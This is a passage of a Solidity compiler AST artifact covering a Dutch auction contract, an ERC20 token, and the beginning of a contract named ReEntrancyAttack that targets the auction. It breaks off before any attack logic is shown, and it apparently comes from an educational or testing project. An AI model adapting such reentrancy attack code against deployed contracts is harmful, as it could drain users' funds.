ref"}},"id":1898,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"11244:19:7","memberName":"totalAlgosPurchased","nodeType":"MemberAccess","referencedDeclaration":1049,"src":"11224:39:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1894,"id":1899,"nodeType":"Return","src":"11217:46:7"}]},"functionSelector":"83634e1c","id":1901,"implemented":true,"kind":"function","modifiers":[{"id":1891,"kind":"modifierInvocation","modifierName":{"id":1890,"name":"onlyOwner","nameLocations":["11179:9:7"],"nodeType":"IdentifierPath","referencedDeclaration":1112,"src":"11179:9:7"},"nodeType":"ModifierInvocation","src":"11179:9:7"}],"name":"retrieveBidderAlgos","nameLocation":"11117:19:7","nodeType":"FunctionDefinition","parameters":{"id":1889,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1888,"mutability":"mutable","name":"bidder","nameLocation":"11154:6:7","nodeType":"VariableDeclaration","scope":1901,"src":"11146:14:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1887,"name":"uint256","nodeType":"ElementaryTypeName","src":"11146:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11136:30:7"},"returnParameters":{"id":1894,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1893,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1901,"src":"11198:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1892,"name":"uint256","nodeType":"ElementaryTypeName","src":"11198:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11197:9:7"},"scope":1950,"src":"11108:162:7","stateMutability":"view","virtual":false,"visibility":"public"},{"body":{"id":1915,"nodeType":"Block","src":"11370:53:7","statements":[{"expression":{"expression":{"baseExpression":{"id":1910,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"11387:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1912,"indexExpression":{"id":1911,"name":"bidder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1903,"src":"11399:6:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"11387:19:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1913,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"11407:9:7","memberName":"refundEth","nodeType":"MemberAccess","referencedDeclaration":1051,"src":"11387:29:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1909,"id":1914,"nodeType":"Return","src":"11380:36:7"}]},"functionSelector":"a45b4abb","id":1916,"implemented":true,"kind":"function","modifiers":[{"id":1906,"kind":"modifierInvocation","modifierName":{"id":1905,"name":"onlyOwner","nameLocations":["11342:9:7"],"nodeType":"IdentifierPath","referencedDeclaration":1112,"src":"11342:9:7"},"nodeType":"ModifierInvocation","src":"11342:9:7"}],"name":"retrieveRefund","nameLocation":"11285:14:7","nodeType":"FunctionDefinition","parameters":{"id":1904,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1903,"mutability":"mutable","name":"bidder","nameLocation":"11317:6:7","nodeType":"VariableDeclaration","scope":1916,"src":"11309:14:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1902,"name":"uint256","nodeType":"ElementaryTypeName","src":"11309:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11299:30:7"},"returnParameters":{"id":1909,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1908,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1916,"src":"11361:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1907,"name":"uint256","nodeType":"ElementaryTypeName","src":"11361:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11360:9:7"},"scope":1950,"src":"11276:147:7","stateMutability":"view","virtual":false,"visibility":"public"},{"body":{"id":1931,"nodeType":"Block","src":"11500:76:7","statements":[{"expression":{"arguments":[{"expression":{"baseExpression":{"id":1925,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"11535:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1927,"indexExpression":{"id":1926,"name":"bidder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1918,"src":"11547:6:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"11535:19:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1928,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"11555:13:7","memberName":"walletAddress","nodeType":"MemberAccess","referencedDeclaration":1045,"src":"11535:33:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"expression":{"id":1923,"name":"DAToken","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1034,"src":"11517:7:7","typeDescriptions":{"typeIdentifier":"t_contract$_ERC20Token_$2018","typeString":"contract ERC20Token"}},"id":1924,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"11525:9:7","memberName":"balanceOf","nodeType":"MemberAccess","referencedDeclaration":385,"src":"11517:17:7","typeDescriptions":{"typeIdentifier":"t_function_external_view$_t_address_$returns$_t_uint256_$","typeString":"function (address) view external returns (uint256)"}},"id":1929,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11517:52:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1922,"id":1930,"nodeType":"Return","src":"11510:59:7"}]},"functionSelector":"2d21a3ed","id":1932,"implemented":true,"kind":"function","modifiers":[],"name":"balanceOfBidder","nameLocation":"11438:15:7","nodeType":"FunctionDefinition","parameters":{"id":1919,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1918,"mutability":"mutable","name":"bidder","nameLocation":"11462:6:7","nodeType":"VariableDeclaration","scope":1932,"src":"11454:14:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1917,"name":"uint256","nodeType":"ElementaryTypeName","src":"11454:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11453:16:7"},"returnParameters":{"id":1922,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1921,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1932,"src":"11491:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1920,"name":"uint256","nodeType":"ElementaryTypeName","src":"11491:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11490:9:7"},"scope":1950,"src":"11429:147:7","stateMutability":"view","virtual":false,"visibility":"public"},{"body":{"id":1935,"nodeType":"Block","src":"11610:31:7","statements":[]},"id":1936,"implemented":true,"kind":"fallback","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":1933,"nodeType":"ParameterList","parameters":[],"src":"11590:2:7"},"returnParameters":{"id":1934,"nodeType":"ParameterList","parameters":[],"src":"11610:0:7"},"scope":1950,"src":"11582:59:7","stateMutability":"payable","virtual":false,"visibility":"external"},{"body":{"id":1939,"nodeType":"Block","src":"11674:31:7","statements":[]},"id":1940,"implemented":true,"kind":"receive","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":1937,"nodeType":"ParameterList","parameters":[],"src":"11654:2:7"},"returnParameters":{"id":1938,"nodeType":"ParameterList","parameters":[],"src":"11674:0:7"},"scope":1950,"src":"11647:58:7","stateMutability":"payable","virtual":false,"visibility":"external"},{"body":{"id":1948,"nodeType":"Block","src":"11773:38:7","statements":[{"expression":{"id":1946,"name":"s_auctionState","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1060,"src":"11790:14:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"functionReturnParameters":1945,"id":1947,"nodeType":"Return","src":"11783:21:7"}]},"functionSelector":"08bfc300","id":1949,"implemented":true,"kind":"function","modifiers":[],"name":"getAuctionState","nameLocation":"11720:15:7","nodeType":"FunctionDefinition","parameters":{"id":1941,"nodeType":"ParameterList","parameters":[],"src":"11735:2:7"},"returnParameters":{"id":1945,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1944,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1949,"src":"11759:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"},"typeName":{"id":1943,"nodeType":"UserDefinedTypeName","pathNode":{"id":1942,"name":"AuctionState","nameLocations":["11759:12:7"],"nodeType":"IdentifierPath","referencedDeclaration":1057,"src":"11759:12:7"},"referencedDeclaration":1057,"src":"11759:12:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"visibility":"internal"}],"src":"11758:14:7"},"scope":1950,"src":"11711:100:7","stateMutability":"view","virtual":false,"visibility":"public"}],"scope":1951,"src":"302:11511:7","usedErrors":[1000,1002,1004,1006],"usedEvents":[1159,1167,1173,1179,1187,1195,1203]}],"src":"33:11781:7"},"id":7},"contracts/ERC20Token.sol":{"ast":{"absolutePath":"contracts/ERC20Token.sol","exportedSymbols":{"Context":[925],"ERC20":[799],"ERC20Token":[2018],"IERC20":[877],"IERC20Errors":[189],"IERC20Metadata":[903],"Ownable":[147]},"id":2019,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":1952,"literals":["solidity","^","0.8",".21"],"nodeType":"PragmaDirective","src":"32:24:8"},{"absolutePath":"@openzeppelin/contracts/token/ERC20/ERC20.sol","file":"@openzeppelin/contracts/token/ERC20/ERC20.sol","id":1953,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":2019,"sourceUnit":800,"src":"58:55:8","symbolAliases":[],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/utils/Context.sol","file":"@openzeppelin/contracts/utils/Context.sol","id":1954,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":2019,"sourceUnit":926,"src":"114:51:8","symbolAliases":[],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/access/Ownable.sol","file":"@openzeppelin/contracts/access/Ownable.sol","id":1955,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":2019,"sourceUnit":148,"src":"166:52:8","symbolAliases":[],"unitAlias":""},{"abstract":false,"baseContracts":[{"baseName":{"id":1956,"name":"Context","nameLocations":["243:7:8"],"nodeType":"IdentifierPath","referencedDeclaration":925,"src":"243:7:8"},"id":1957,"nodeType":"InheritanceSpecifier","src":"243:7:8"},{"baseName":{"id":1958,"name":"ERC20","nameLocations":["252:5:8"],"nodeType":"IdentifierPath","referencedDeclaration":799,"src":"252:5:8"},"id":1959,"nodeType":"InheritanceSpecifier","src":"252:5:8"},{"baseName":{"id":1960,"name":"Ownable","nameLocations":["259:7:8"],"nodeType":"IdentifierPath","referencedDeclaration":147,"src":"259:7:8"},"id":1961,"nodeType":"InheritanceSpecifier","src":"259:7:8"}],"canonicalName":"ERC20Token","contractDependencies":[],"contractKind":"contract","fullyImplemented":true,"id":2018,"linearizedBaseContracts":[2018,147,799,189,903,877,925],"name":"ERC20Token","nameLocation":"229:10:8","nodeType":"ContractDefinition","nodes":[{"body":{"id":1997,"nodeType":"Block","src":"401:124:8","statements":[{"expression":{"arguments":[{"expression":{"id":1977,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"417:3:8","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":1978,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"421:6:8","memberName":"sender","nodeType":"MemberAccess","src":"417:10:8","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1984,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1979,"name":"initialSupply","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1963,"src":"429:13:8","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_rational_1000000000000000000_by_1","typeString":"int_const 1000000000000000000"},"id":1982,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":1980,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"446:2:8","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3138","id":1981,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"452:2:8","typeDescriptions":{"typeIdentifier":"t_rational_18_by_1","typeString":"int_const 18"},"value":"18"},"src":"446:8:8","typeDescriptions":{"typeIdentifier":"t_rational_1000000000000000000_by_1","typeString":"int_const 1000000000000000000"}}],"id":1983,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"445:10:8","typeDescriptions":{"typeIdentifier":"t_rational_1000000000000000000_by_1","typeString":"int_const 1000000000000000000"}},"src":"429:26:8","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1976,"name":"_mint","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":639,"src":"411:5:8","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,uint256)"}},"id":1985,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"411:45:8","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1986,"nodeType":"ExpressionStatement","src":"411:45:8"},{"expression":{"arguments":[{"id":1988,"name":"contractAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1965,"src":"474:15:8","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1994,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1989,"name":"initialSupply","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1963,"src":"491:13:8","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_rational_1000000000000000000_by_1","typeString":"int_const 1000000000000000000"},"id":1992,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":1990,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"508:2:8","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3138","id":1991,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"514:2:8","typeDescriptions":{"typeIdentifier":"t_rational_18_by_1","typeString":"int_const 18"},"value":"18"},"src":"508:8:8","typeDescriptions":{"typeIdentifier":"t_rational_1000000000000000000_by_1","typeString":"int_const 1000000000000000000"}}],"id":1993,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"507:10:8","typeDescriptions":{"typeIdentifier":"t_rational_1000000000000000000_by_1","typeString":"int_const 1000000000000000000"}},"src":"491:26:8","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1987,"name":"approve","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":450,"src":"466:7:8","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$","typeString":"function (address,uint256) returns (bool)"}},"id":1995,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"466:52:8","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1996,"nodeType":"ExpressionStatement","src":"466:52:8"}]},"id":1998,"implemented":true,"kind":"constructor","modifiers":[{"arguments":[{"expression":{"id":1968,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"363:3:8","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":1969,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"367:6:8","memberName":"sender","nodeType":"MemberAccess","src":"363:10:8","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"id":1970,"kind":"baseConstructorSpecifier","modifierName":{"id":1967,"name":"Ownable","nameLocations":["355:7:8"],"nodeType":"IdentifierPath","referencedDeclaration":147,"src":"355:7:8"},"nodeType":"ModifierInvocation","src":"355:19:8"},{"arguments":[{"hexValue":"4552433230546f6b656e","id":1972,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"381:12:8","typeDescriptions":{"typeIdentifier":"t_stringliteral_aea199e31a596269b42cdafd93407f14436db6e4cad65417994c2eb37381e05a","typeString":"literal_string \"ERC20Token\""},"value":"ERC20Token"},{"hexValue":"4554","id":1973,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"395:4:8","typeDescriptions":{"typeIdentifier":"t_stringliteral_1b640cca2d55d74e0f41f69d831edb693745709ddda090e5f31bdbcf84d22120","typeString":"literal_string \"ET\""},"value":"ET"}],"id":1974,"kind":"baseConstructorSpecifier","modifierName":{"id":1971,"name":"ERC20","nameLocations":["375:5:8"],"nodeType":"IdentifierPath","referencedDeclaration":799,"src":"375:5:8"},"nodeType":"ModifierInvocation","src":"375:25:8"}],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":1966,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1963,"mutability":"mutable","name":"initialSupply","nameLocation":"302:13:8","nodeType":"VariableDeclaration","scope":1998,"src":"294:21:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1962,"name":"uint256","nodeType":"ElementaryTypeName","src":"294:7:8","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1965,"mutability":"mutable","name":"contractAddress","nameLocation":"333:15:8","nodeType":"VariableDeclaration","scope":1998,"src":"325:23:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1964,"name":"address","nodeType":"ElementaryTypeName","src":"325:7:8","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"284:70:8"},"returnParameters":{"id":1975,"nodeType":"ParameterList","parameters":[],"src":"401:0:8"},"scope":2018,"src":"273:252:8","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"body":{"id":2016,"nodeType":"Block","src":"595:50:8","statements":[{"expression":{"arguments":[{"id":2008,"name":"i_owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2000,"src":"611:7:8","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2013,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2009,"name":"amount","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2002,"src":"620:6:8","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"commonType":{"typeIdentifier":"t_rational_1000000000000000000_by_1","typeString":"int_const 1000000000000000000"},"id":2012,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":2010,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"629:2:8","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3138","id":2011,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"635:2:8","typeDescriptions":{"typeIdentifier":"t_rational_18_by_1","typeString":"int_const 18"},"value":"18"},"src":"629:8:8","typeDescriptions":{"typeIdentifier":"t_rational_1000000000000000000_by_1","typeString":"int_const 1000000000000000000"}},"src":"620:17:8","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2007,"name":"_burn","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":672,"src":"605:5:8","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,uint256)"}},"id":2014,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"605:33:8","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2015,"nodeType":"ExpressionStatement","src":"605:33:8"}]},"functionSelector":"9dc29fac","id":2017,"implemented":true,"kind":"function","modifiers":[{"id":2005,"kind":"modifierInvocation","modifierName":{"id":2004,"name":"onlyOwner","nameLocations":["585:9:8"],"nodeType":"IdentifierPath","referencedDeclaration":58,"src":"585:9:8"},"nodeType":"ModifierInvocation","src":"585:9:8"}],"name":"burn","nameLocation":"540:4:8","nodeType":"FunctionDefinition","parameters":{"id":2003,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2000,"mutability":"mutable","name":"i_owner","nameLocation":"553:7:8","nodeType":"VariableDeclaration","scope":2017,"src":"545:15:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1999,"name":"address","nodeType":"ElementaryTypeName","src":"545:7:8","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2002,"mutability":"mutable","name":"amount","nameLocation":"570:6:8","nodeType":"VariableDeclaration","scope":2017,"src":"562:14:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2001,"name":"uint256","nodeType":"ElementaryTypeName","src":"562:7:8","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"544:33:8"},"returnParameters":{"id":2006,"nodeType":"ParameterList","parameters":[],"src":"595:0:8"},"scope":2018,"src":"531:114:8","stateMutability":"nonpayable","virtual":false,"visibility":"public"}],"scope":2019,"src":"220:427:8","usedErrors":[13,18,159,164,169,178,183,188],"usedEvents":[24,811,820]}],"src":"32:616:8"},"id":8},"contracts/ReEntrancyAttack.sol":{"ast":{"absolutePath":"contracts/ReEntrancyAttack.sol","exportedSymbols":{"Context":[925],"Dutch_Auction":[1950],"Dutch_Auction__IsOwner":[1002],"Dutch_Auction__NotOpen":[1004],"Dutch_Auction__NotOwner":[1000],"Dutch_Auction__Open":[1006],"ERC20":[799],"ERC20Token":[2018],"IERC20":[877],"IERC20Errors":[189],"IERC20Metadata":[903],"Ownable":[147],"ReEntrancyAttack":[2081],"ReentrancyGuard":[994]},"id":2082,"license":"MITRe Entry Attack","nodeType":"SourceUnit","nodes":[{"id":2020,"literals":["solidity","^","0.8",".21"],"nodeType":"PragmaDirective","src":"48:24:9"},{"absolutePath":"contracts/Dutch_Auction.sol","file":"./Dutch_Auction.sol","id":2021,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":2082,"sourceUnit":1951,"src":"74:29:9","symbolAliases":[],"unitAlias":""},{"abstract":false,"baseContracts":[],"canonicalName":"ReEntrancyAttack","contractDependencies":[],"contractKind":"contract","fullyImplemented":true,"id":2081,"linearizedBaseContracts":[2081],"name":"ReEntrancyAttack","nameLocation":"114:16:9","nodeType":"ContractDefinition","nodes":[{"constant":false,"id":2024,"mutability":"mutable","name":"target","nameLocation":"151:6:9","nodeType":"VariableDeclaration","scope":2081,"src":"137:20:9","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"},"typeName":{"id":2023,"nodeType":"UserDefinedTypeName","pathNode":{"id":2022,"name":"Dutch_Auction","nameLocations":["137:13:9"],"nodeType":"IdentifierPath","referencedDeclaration":1950,"src":"137:13:9"},"referencedDeclaration":1950,"src":"137:13:9","typeDescriptions":{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}},"visibility":"internal"},{"constant":false,"id":2026,"mutability":"mutable","name":"targetA","nameLocation":"171:7:9","nodeType":"VariableDeclaration","scope":2081,"src":"163:15:9","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2025,"name":"address","nodeType":"ElementaryTypeName","src":"163:7:9","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"body":{"id":2041,"nodeType":"Block","src":"229:75:9","statements":[{"expression":{"id":2035,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2031,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2024,"src":"239:6:9","typeDescriptions":{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":2033,"name":"_target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2028,"src":"262:7:9","typeDescriptions":{"typeIdentifier":"t_address_payable","typeString":"address payable"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address_payable","typeString":"address payable"}],"id":2032,"name":"Dutch_Auction","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1950,"src":"248:13:9","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Dutch_Auction_$1950_$","typeString":"type(contract Dutch_Auction)"}},"id":2034,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"248:22:9","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}},"src":"239:31:9","typeDescriptions":{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}},"id":2036,"nodeType":"ExpressionStatement","src":"239:31:9"},{"expression":{"id":2039,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2037,"name":"targetA","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2026,"src":"280:7:9","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":2038,"name":"_target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2028,"src":"290:7:9","typeDescriptions":{"typeIdentifier":"t_address_payable","typeString":"address 